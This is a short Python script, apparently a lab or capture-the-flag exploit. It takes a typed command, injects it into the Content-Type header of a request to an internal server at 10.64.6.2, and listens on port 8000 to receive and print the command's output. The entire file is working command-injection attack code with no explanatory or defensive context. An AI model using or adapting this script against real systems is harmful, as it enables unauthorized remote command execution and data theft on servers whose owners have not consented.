import socket
import requests
commandToRun = input(">")
response = requests.get('http://10.64.6.2:8000', headers={'Content-Type': f"&{commandToRun}&"})

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.bind(('',8000))
sock.listen(1)

conn, addr = sock.accept()
data = conn.recv(58)
print(data.decode('utf-8'))
data = conn.recv(4069)
print(data.decode('utf-8'))
sock.close()

